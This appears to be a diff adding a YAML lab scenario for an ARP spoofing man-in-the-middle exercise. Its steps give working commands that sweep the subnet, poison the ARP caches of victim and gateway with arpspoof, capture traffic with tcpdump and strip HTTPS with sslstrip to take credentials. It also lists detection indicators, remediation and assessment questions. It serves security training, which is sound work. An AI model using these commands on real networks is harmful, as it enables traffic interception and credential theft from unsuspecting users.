@@ -1,0 +1,113 @@
+# Category: Network Security
+name: "ARP Spoofing – Man‑in‑the‑Middle Attack"
+id: "network-arp-spoof-001"
+category: "network_security"
+subcategory: "lan"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Perform ARP spoofing (ARP poisoning) on a local network to intercept
+  traffic between a victim and the gateway. By sending forged ARP replies,
+  the attacker tricks the victim into associating the attacker's MAC address
+  with the gateway IP, allowing traffic sniffing, modification, and credential
+  theft.
+
+learning_objectives:
+  - Understand ARP protocol and its lack of authentication
+  - Use tools like `arpspoof` or `bettercap` to poison ARP caches
+  - Capture and analyze network traffic (HTTP, FTP, etc.)
+  - Perform SSL stripping to downgrade HTTPS
+
+tools:
+  - arpspoof (dsniff)
+  - bettercap
+  - ettercap
+  - Wireshark
+  - tcpdump
+  - sslstrip
+
+prerequisites:
+  - Local network access (same subnet as victim)
+  - Attacker machine with packet forwarding enabled
+  - Victim's IP address
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify target and gateway IPs"
+    commands:
+      - "# Scan network for hosts"
+      - "nmap -sn 192.168.1.0/24"
+      - "# Determine default gateway"
+      - "ip route | grep default"
+    expected_output: "List of active hosts and gateway IP"
+    detection: "ARP scanning activity on network"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Launch ARP spoofing"
+    commands:
+      - "# Enable IP forwarding"
+      - "sysctl net.ipv4.ip_forward=1"
+      - "# Spoof victim: attacker claims to be gateway"
+      - "arpspoof -i eth0 -t <VICTIM_IP> <GATEWAY_IP>"
+      - "# Spoof gateway: attacker claims to be victim"
+      - "arpspoof -i eth0 -t <GATEWAY_IP> <VICTIM_IP>"
+    expected_output: "ARP cache of victim and gateway now point to attacker's MAC"
+    detection: "ARP table changes; duplicate IP alerts; switch CAM table anomalies"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Sniff traffic and capture credentials"
+    commands:
+      - "# Capture with tcpdump"
+      - "tcpdump -i eth0 -w capture.pcap"
+      - "# Or use Wireshark to filter HTTP POST"
+      - "# Use sslstrip to strip HTTPS"
+      - "sslstrip -l 8080"
+      - "# Redirect HTTP to sslstrip"
+    expected_output: "Credentials (e.g., login passwords) captured in plaintext"
+    detection: "HTTP traffic spikes; SSL certificate errors for victims"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1557"
+    description: "Adversary-in-the-Middle"
+  - standard: "NIST SP 800-53"
+    control: "SC-8"
+    description: "Transmission Confidentiality and Integrity"
+
+detection:
+  network_indicators:
+    - "ARP packets with conflicting MAC‑IP mappings"
+    - "Traffic to gateway with unusual TTL or hop count"
+  log_indicators:
+    - "Switch logs for MAC flapping"
+    - "IDS alerts for ARP spoofing"
+  endpoint_indicators:
+    - "arpspoof or bettercap processes"
+
+remediation:
+  immediate:
+    - "Use static ARP entries for critical hosts"
+    - "Enable Dynamic ARP Inspection (DAI) on switches"
+  long_term:
+    - "Use 802.1X for network access control"
+    - "Employ VPNs or encryption at application layer (TLS)"
+
+variables:
+  victim_ip: "192.168.1.100"
+  gateway_ip: "192.168.1.1"
+  interface: "eth0"
+
+assessment_questions:
+  - "Why does ARP spoofing work despite IP being statically assigned?"
+  - "How does Dynamic ARP Inspection prevent spoofing?"
+  - "What is the difference between a MITM and a replay attack?"
+
+references:
+  - url: "https://www.ietf.org/rfc/rfc826.txt"
+    title: "ARP RFC"
+  - url: "https://www.mitnicksecurity.com/blog/arp-poisoning"
+    title: "ARP Spoofing Guide"
